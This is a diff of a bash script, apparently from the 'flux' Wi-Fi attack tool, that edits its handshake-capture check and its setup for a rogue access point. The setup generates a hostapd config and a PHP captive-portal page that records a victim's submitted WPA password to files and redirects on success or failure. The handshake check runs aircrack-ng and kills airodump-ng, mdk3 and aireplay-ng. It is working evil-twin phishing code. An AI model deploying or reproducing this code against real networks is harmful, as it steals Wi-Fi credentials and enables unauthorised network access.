@@ -1198,7 +1198,7 @@ function checkhandshake {
         if [ "$handshakemode" = "normal" ]; then
                 if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
                         killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
-                        wpaclean $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
+                        mv $DUMP_PATH/$Host_MAC-01.cap $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap
                         certssl
                         i=2
                         break
@@ -1842,65 +1842,70 @@ fi
 # Create different settings required for the script
 function preattack {
 
-        # Config HostAPD
-        echo "interface=$WIFI
-driver=nl80211
-ssid=$Host_SSID
-channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf
+    # Check if channel is negative
+    if [ $CHANNEL < 0 ];then
+        CHANNEL=$(echo $(($CHANNEL*-1)))
+    fi
 
-        # Creates PHP
-        echo "<?php
-error_reporting(0);
+    # Config HostAPD
+    echo "interface=$WIFI
+    driver=nl80211
+    ssid=$Host_SSID
+    channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf
 
-\$count_my_page = (\"$DUMP_PATH/hit.txt\");
-\$hits = file(\$count_my_page);
-\$hits[0] ++;
-\$fp = fopen(\$count_my_page , \"w\");
-fputs(\$fp , \$hits[0]);
-fclose(\$fp);
+            # Creates PHP
+            echo "<?php
+    error_reporting(0);
 
-// Receive form Post data and Saving it in variables
-\$key1 = @\$_POST['key1'];
+    \$count_my_page = (\"$DUMP_PATH/hit.txt\");
+    \$hits = file(\$count_my_page);
+    \$hits[0] ++;
+    \$fp = fopen(\$count_my_page , \"w\");
+    fputs(\$fp , \$hits[0]);
+    fclose(\$fp);
 
-// Write the name of text file where data will be store
-\$filename = \"$DUMP_PATH/data.txt\";
-\$filename2 = \"$DUMP_PATH/status.txt\";
-\$intento = \"$DUMP_PATH/intento\";
-\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
+    // Receive form Post data and Saving it in variables
+    \$key1 = @\$_POST['key1'];
 
-// Marge all the variables with text in a single variable.
-\$f_data= ''.\$key1.'';
+    // Write the name of text file where data will be store
+    \$filename = \"$DUMP_PATH/data.txt\";
+    \$filename2 = \"$DUMP_PATH/status.txt\";
+    \$intento = \"$DUMP_PATH/intento\";
+    \$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
 
-\$pwlog = fopen(\$attemptlog, \"w\");
-fwrite(\$pwlog, \$f_data);
-fwrite(\$pwlog,\"\n\");
-fclose(\$pwlog);
+    // Marge all the variables with text in a single variable.
+    \$f_data= ''.\$key1.'';
 
-\$file = fopen(\$filename, \"w\");
-fwrite(\$file, \$f_data);
-fwrite(\$file,\"\n\");
-fclose(\$file);
+    \$pwlog = fopen(\$attemptlog, \"w\");
+    fwrite(\$pwlog, \$f_data);
+    fwrite(\$pwlog,\"\n\");
+    fclose(\$pwlog);
 
-\$archivo = fopen(\$intento, \"w\");
-fwrite(\$archivo,\"\n\");
-fclose(\$archivo);
+    \$file = fopen(\$filename, \"w\");
+    fwrite(\$file, \$f_data);
+    fwrite(\$file,\"\n\");
+    fclose(\$file);
 
-while( 1 ) {
+    \$archivo = fopen(\$intento, \"w\");
+    fwrite(\$archivo,\"\n\");
+    fclose(\$archivo);
 
-        if (file_get_contents( \$intento ) == 1) {
-                header(\"Location:error.html\");
-                unlink(\$intento);
-            break;
-        }
+    while( 1 ) {
 
-        if (file_get_contents( \$intento ) == 2) {
-                header(\"Location:final.html\");
+            if (file_get_contents( \$intento ) == 1) {
+                    header(\"Location:error.html\");
+                    unlink(\$intento);
                 break;
-        }
+            }
 
-        sleep(1);
-}
-?>" > $DUMP_PATH/data/check.php
+            if (file_get_contents( \$intento ) == 2) {
+                    header(\"Location:final.html\");
+                    break;
+            }
+
+            sleep(1);
+    }
+    ?>" > $DUMP_PATH/data/check.php
 
         # Config DHCP
         echo "authoritative;
